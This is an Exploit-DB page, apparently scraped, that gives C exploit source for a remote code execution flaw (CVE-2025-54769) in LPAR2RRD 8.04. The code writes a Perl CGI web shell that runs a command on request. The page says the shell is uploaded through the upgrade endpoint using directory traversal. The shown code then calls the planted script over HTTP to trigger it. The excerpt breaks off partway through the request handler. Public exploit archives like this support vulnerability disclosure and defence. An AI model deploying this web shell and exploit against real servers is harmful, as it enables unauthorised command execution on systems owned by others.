---
title: [webapps] LPAR2RRD 8.04 - Remote Code Execution (RCE)
url: https://www.exploit-db.com/exploits/52391
source: Exploit-DB.com RSS Feed
date: 2025-08-04
fetch_date: 2025-10-07T00:15:03.584227
---

# [webapps] LPAR2RRD 8.04 - Remote Code Execution (RCE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# LPAR2RRD 8.04 - Remote Code Execution (RCE)

#### EDB-ID:

###### 52391

#### CVE:

###### [2025-54769](https://nvd.nist.gov/vuln/detail/CVE-2025-54769)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-03

---

**Vulnerable App:**

```
/*
 * Author       : Byte Reaper
 * Title : LPAR2RRD 8.04 - Remote Code Execution (RCE)
 * CVE          : CVE-2025-54769
 * Vulnerability: RCE && directory traversal
 * Description : Uploads a malicious Perl script via the LPAR2RRD upgrade endpoint,
 * exploits directory traversal to place it in a CGI-executable path, then triggers remote command execution.
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <curl/curl.h>
 #include "argparse.h"
 #include <string.h>
 #include <time.h>
 #include <arpa/inet.h>
 #define FULL 2500

 void sleepAssembly()
 {
     struct timespec s ;
     s.tv_sec = 0;
     s.tv_nsec = 500000000;

     __asm__ volatile
     (
         "mov $35, %%rax\n\t"
         "xor %%rsi, %%rsi\n\t"
         "syscall\n\t"
         :
         : "D" (&s)
         : "rax",
           "rsi",
           "memory"
        );
 }
 void syscallLinux()
 {
     __asm__ volatile
     (
         "mov $0x3C, %%rax\n\t"
         "xor %%rdi, %%rdi\n\t"
         "syscall\n\t"
         :
         :
         :"rax", "rdi"
     );
 }
 int fileS = 0;
 int useCookies = 0;
 int verboseMode = 0;
 const char *cookies;
 const char *ip = NULL;
 int portService = 0;
 int port = 0;
 int protocolS = 0;
 const char  *protocol = NULL;
 int CreateFilePerl()
 {
    FILE *fileP = fopen("users.pl", "w");
    if (fileP == NULL)
    {
        printf("\e[1;31m[-] Error Create File (users.pl)\e[0m\n");
        syscallLinux();
        return 0;
    }
    printf("[+] Create File Successfully\n");
    char payloadContent[7000];
    int payload = snprintf(payloadContent,
         sizeof(payloadContent),
     "#!/usr/bin/perl\n"
                 "use strict;\n"
                 "use warnings;\n"
                 "use CGI;\n"
                 "my $q   = CGI->new;\n"
                 "my %%PAR = map { $_ => scalar $q->param($_) } $q->param;\n"
                 "if ( $PAR{cmd} && $PAR{cmd} eq \"commandLinux\")\n"
                 "{\n"
                         "\tprint \"Content-type: text/html\\n\\n\";\n"
                         "\tmy $commandW = qx(/usr/bin/whoami 2>&1);\n"
                         "\tprint $commandW;\n"
                 "}\n"
        );
    if (payload < 0 || (size_t)payload >= sizeof(payloadContent))
    {
        fprintf(stderr,
            "\e[1;31m[-] Perl payload truncated or formatting error\e[0m\n");
        syscallLinux();
    }

    size_t e = strlen(payloadContent);
    unsigned long writeLen = fwrite(payloadContent,
         1, strlen(payloadContent),
          fileP);
    if (writeLen != e)
    {
        printf("\e[1;31m[-] Error Fwrite Payload in File Perl\e[0m\n");
        syscallLinux();
        return 0;
    }
    printf("\e[1;36m[+] Write Payload in File Successfully\e[0m\n");
    fclose(fileP);
    return 1;
}
const char *resultCommand[] =
{
    "root",
    "admin",
    "user",
    "ssh",
    "/home/",
    NULL
};

struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr,
    size_t size,
    size_t nmemb,
    void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        syscallLinux();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
void getRequest(CURL *curl, const char *targetIP)
{
    struct Mem responseGet ;
    responseGet.buffer = NULL;
    responseGet.len = 0;
    CURLcode codeLib;
    char full[FULL];
    const char *proto = protocolS ? protocol : "https";
    int prt = portService
              ? port
           : (strcmp(proto, "http") == 0 ? 80 : 443);
    int n = snprintf(full, sizeof(full),
                  "%s://%s:%d/lpar2rrd-cgi/users.sh?cmd=commandLinux",
                     proto, targetIP, prt);
    if (n < 0 || (size_t)n >= sizeof(full))
    {
         fprintf(stderr, "\e[1;31m[-] URL buffer too small\e[0m\n");
         syscallLinux();
    }

    curl_easy_setopt(curl, CURLOPT_URL, full);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseGet);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    sleepAssembly();
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    if (useCookies)
    {
         curl_easy_setopt(curl,
            CURLOPT_COOKIEFILE,
            cookies);
         curl_easy_setopt(curl,
             CURLOPT_COOKIEJAR,
             cookies);
    }
    if (verboseMode)
    {
        printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
        curl_easy_setopt(curl,
                CURLOPT_VERBOSE,
                         1L);
    }

    printf("\e[1;37m[+] GET URL: %s\e[0m\n",
        full);
    struct curl_slist *headers = NULL;
     headers = curl_slist_append(headers ,
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers,
         "Accept-Language: en-US,en;q=0.5");
    headers = curl_slist_append(headers,
        "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers,
        "Upgrade-Insecure-Requests: 1");
    headers = curl_slist_append(headers,
        "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers,
        "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers,
        "Priority: u=0, i");
    headers = curl_slist_append(headers,
        "Pragma: no-cache");
    headers = curl_slist_append(headers,
        "Cache-Control: no-cache");
    headers = curl_slist_append(headers,
        "Connection: keep-alive");
    curl_easy_setopt(curl,
        CURLOPT_HTTPHEADER,
        headers);
    codeLib = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    if (codeLib == CURLE_OK)
    {
        printf("\e[1;35m=================================================== [GET] ===================================================\e[0m\n");
        long codeH = 0;
        curl_easy_getinfo(curl,
            CURLINFO_RESPONSE_CODE,
             &codeH);

        printf("\e[1;36m[+] Request GET sent successfully\e[0m\n");
        printf("\e[1;32m[+] Http Code -> %ld\e[0m\n", codeH);
        if (responseGet.buffer)
        {
            if (verboseMode)
            {
                printf("\e[1;35m=================================================== [RESPONSE] ===================================================\e[0m\n");

                printf("%s\n", responseGet.buffer);
                printf("\e[1;35m===================================================================================================================\e[0m\n");
            }
        }

        if (codeH >= 200 && codeH < 300)
        {
            printf("\e[1;36m[+] Positive Http Code (200 < 300) : %ld\e[0m\n",codeH);
            printf("\e[1;32m[+] Http Code ->...